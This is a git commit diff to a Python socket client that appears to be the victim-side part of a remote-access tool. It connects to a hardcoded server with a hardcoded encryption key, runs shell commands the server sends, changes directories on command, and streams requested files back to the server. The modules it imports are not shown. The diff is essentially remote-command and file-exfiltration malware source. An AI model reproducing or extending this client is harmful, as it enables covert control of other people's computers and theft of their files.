53137aacdd6e8a9c10fb3215fa1efd81f0539bff
Ahmed Saeed <ahmedsaeedramadan@yahoo.com>
2020-08-25 05:36:11 +0200

    Add files via upload

--- client/socclient.py
+++ client/socclient.py
@@ -1,31 +1,54 @@
 from core.connect import  connect
 from core.command import command
 from core.crypter import cryptMsg
+from core.file import filestream
 import time
 
 def main():
 	try:
-		con = connect('127.0.0.1' , 8080)
-		crypter = cryptMsg('this is my key b')
+		ip = '127.0.0.1'
+		port = 8080
+		key = 'this is my key b'
+		deli = '<end_of_data>'
+		con = connect(ip , port)
+		crypter = cryptMsg(key)
 		comm = command()
-		print(crypter.encrypt(comm.get_data() + '<end_of_data>'))
-		con.send_serv(crypter.encrypt(comm.get_data() + '<end_of_data>'))
+		con.send_serv(crypter.encrypt(comm.get_data() + deli))
 		while True :
 			comm.flush_cmd()
 			data = ''
 			cmd = crypter.decrypt(con.recv_serv())
+			print(cmd)
 			if cmd == '' :
 				continue
-			if cmd == 'upload':
+			elif cmd.find('cd', 0 , 2) != -1 :
+				comp = cmd.split()
+				comm.change_dir(comp[1])
+				data = comp[1]
+			elif cmd.find('upload', 0 , 6) != -1:
 				print('uploading')
-			if cmd == 'download':
-				print('downloading')
-			if cmd == 'exit' :
+				continue
+			elif cmd.find('download', 0 , 8) != -1:
+				comp = cmd.split()
+				data = comm.download(comp[1])
+				if data == False:
+					data = 'file not found'
+				else:
+					fs = filestream(comp[1], 'rb')
+					data = fs.read()
+					while len(data) > 0 :
+						con.send_serv(data)
+						data = fs.read()
+					con.send_serv(data +  deli.encode())
+					fs.close()
+					del fs
+				continue
+			elif cmd == 'exit' :
 				data = 'bye'
 			else:
 				data = comm.get_data(cmd)
 			print(data)
-			con.send_serv(crypter.encrypt(data + '<end_of_data>'))
+			con.send_serv(crypter.encrypt(data + deli))
 			if data.find('bye') != -1:
 				break
 		con.close_serv()
